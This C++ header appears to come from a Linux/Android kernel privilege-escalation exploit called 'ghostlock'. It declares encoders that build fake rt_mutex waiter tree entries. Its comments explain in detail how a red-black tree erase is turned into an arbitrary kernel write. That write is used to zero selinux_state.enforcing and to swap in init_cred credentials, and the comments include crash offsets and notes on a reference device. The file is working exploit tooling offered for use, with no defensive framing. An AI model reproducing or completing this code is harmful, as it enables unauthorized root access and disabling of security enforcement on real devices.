#ifndef PAYLOAD_BUILDER_H
#define PAYLOAD_BUILDER_H

#include <cstddef>
#include <cstdint>


#include <cstddef>
#include <cstdint>
#include <span>
#include <type_traits>

namespace ghostlock::memory {
    /* Immutable description of one kernel write. `preserve_child` selects the
 * one-child erase layout; false selects the leaf/zero layout. */
    enum class WriteMode : int32_t {
        Disabled = 0,
        Zero = 1,
        Credential = 2,
    };

    struct WriteRequest final {
        std::uintptr_t target = 0;
        WriteMode mode = WriteMode::Disabled;
        bool preserve_child = false;

        [[nodiscard]] static constexpr WriteRequest make(std::uintptr_t target,
                                                         WriteMode mode,
                                                         bool leaf) noexcept {
            return WriteRequest{target, mode, !leaf};
        }
    };

    struct PayloadWriteLayout final {
        std::uintptr_t parent = 0;
        std::uintptr_t right = 0;
        std::uintptr_t left = 0;
        std::uintptr_t fops = 0;
        bool needs_credential_copy = false;
    };

    static_assert(std::is_standard_layout_v<WriteRequest>);
    static_assert(std::is_trivially_copyable_v<WriteRequest>);
    static_assert(offsetof(WriteRequest, target) == 0);
    static_assert(offsetof(WriteRequest, mode) == sizeof(std::uintptr_t));
    static_assert(std::is_standard_layout_v<PayloadWriteLayout>);
    static_assert(std::is_trivially_copyable_v<PayloadWriteLayout>);

    /* The three words that make the waiter's tree entry the write vehicle:
     * {__rb_parent_color, rb_right, rb_left}. Both the route's stack-waiter stamp
     * and the compact encoder must place the same triple -- this is the single
     * source of truth for it.
     *
     * Two shapes, and both of them perform the write inside the erase while
     * leaving the lock's waiter tree root alone. That last property is not
     * decoration: the walk's [7] does `rt_mutex_dequeue()` and then
     * `rt_mutex_enqueue()` on the same lock, and the enqueue's inlined
     * `while (*link)` descent starts at that root. A root left pointing at a task
     * field is fatal, because the descent reads the "node's" children out of task
     * memory and chases them (captured twice: rt_mutex_adjust_prio_chain+0x548,
     * faults at garbage+0x40, 2026-10-09 runs Q1 and Q2).
     *
     *  - pointer layouts (page-derived / init_cred). The erase arm "the child is
     *    node->rb_left" stores pc at rb_left and re-parents through
     *    __rb_parent(pc) = pc & ~3, so the collateral lands in that pointer's
     *    child slot, never on the root. Shape: {pc = value, right = 0,
     *    left = target}. The value's low byte is load-bearing -- W1 needs byte 0
     *    == 0x00 for selinux_state.enforcing.
     *
     *  - leaf/zero. The node has NO children, so that arm does not apply and no
     *    value is stored at all: with rb_left == rb_right == 0 the whole effect is
     *    __rb_change_child(node, NULL, parent = pc & ~3, root), which writes NULL
     *    at parent->rb_left or parent->rb_right (or, when parent == 0, only clears
     *    the root -- the parking shape). Shape: {pc = target - 8, right = 0,
     *    left = 0}. Then:
     *      * parent = target - 8 != 0, so the tree root is never polluted;
     *      * parent->rb_left is the task word at target - 8, which would have to
     *        be exactly the erased node for the store to go anywhere else, so it
     *        takes the else arm and writes NULL at parent + 8 = *(target) -- the
     *        zero write;
     *      * the enqueue's descent reads the node's own children, both 0, and
     *        exits on its first test whatever `less()` decides, so
     *        rb_link_node() gives it a NULL parent and rb_insert_color() breaks
     *        on its `!parent` arm.
     *    This is the shape the working CPH2521 reference uses ({pc = target-8,
     *    right = value, left = 0}) with value == 0, and what this file's own
     *    layout always meant ("Value 0 uses pc = dest-8 (stores 0 at *dest)"). */
    struct WaiterTreeStamp final {
        std::uintptr_t pc = 0;
        std::uintptr_t right = 0;
        std::uintptr_t left = 0;
    };

    [[nodiscard]] constexpr WaiterTreeStamp waiter_tree_stamp(
        const PayloadWriteLayout &layout) noexcept {
        if (layout.right) {
            return {.pc = layout.right, .right = 0, .left = layout.left};
        }
        return {.pc = layout.parent, .right = layout.right, .left = layout.left};
    }

    /* Fixed payload fragment sizes shared by the encoders and their callers. */
    inline constexpr std::size_t kCompactWaiterBytes = 0x30;

    /* Bounds-checked encoders. They return false without modifying memory when
 * the destination cannot contain every field required by the layout. */
    [[nodiscard]] bool encode_compact_waiter(
        std::span<std::byte> waiter, const WriteRequest &request,
        const PayloadWriteLayout &layout) noexcept;

    [[nodiscard]] bool encode_multicast_waiter(
        std::span<std::byte> buffer, std::size_t waiter_offset,
        std::size_t task_offset, std::size_t lock_offset, std::uintptr_t fake_task,
        std::uintptr_t fake_lock) noexcept;
} // namespace ghostlock::memory

namespace ghostlock::memory {
    /* Resolve the request-dependent words shared by the three route encoders. */
    PayloadWriteLayout payload_write_layout(
        const WriteRequest *request, uintptr_t page_base,
        uintptr_t default_fops, uintptr_t credential_fops,
        uintptr_t init_cred_alias);

    /* Encode the route-neutral compact waiter write arm. Value writes always use
 * {pc=value,right=0,left=target}; leaf writes use {pc=target-8,0,0}. */
    void build_compact_waiter_payload(
        unsigned char *waiter, const WriteRequest *request,
        const PayloadWriteLayout *layout);

    int32_t payload_write_layout_matches_request(
        const WriteRequest *request, const PayloadWriteLayout *layout);

    int32_t payload_write_layout_accepts_page(
        const WriteRequest *request, const PayloadWriteLayout *layout);

    void build_multicast_waiter_payload(
        unsigned char *buffer, size_t waiter_offset, size_t task_offset,
        size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock);

    /* Fixed request/layout vectors, including the upstream unified compact arm. */
    int32_t payload_builder_fixed_vector_test(void);
} // namespace ghostlock::memory

#endif
